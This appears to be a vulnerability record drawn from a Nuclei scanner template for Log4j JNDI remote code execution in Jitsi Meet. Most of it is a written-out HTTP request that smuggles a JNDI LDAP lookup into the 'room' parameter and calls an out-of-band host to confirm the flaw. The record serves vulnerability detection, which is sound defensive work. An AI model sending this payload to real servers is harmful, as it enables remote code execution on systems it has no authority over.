# Vulnerability: Jitsi Meet - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`jitsi-meet-log4j-rce.yaml`)

## Description
Jitsi Meet is susceptible to Log4j JNDI remote code execution. Jitsi is a collection of free and open-source multiplatform voice, video conferencing and instant messaging applications for the Web platforms.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /http-bind?room=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
```

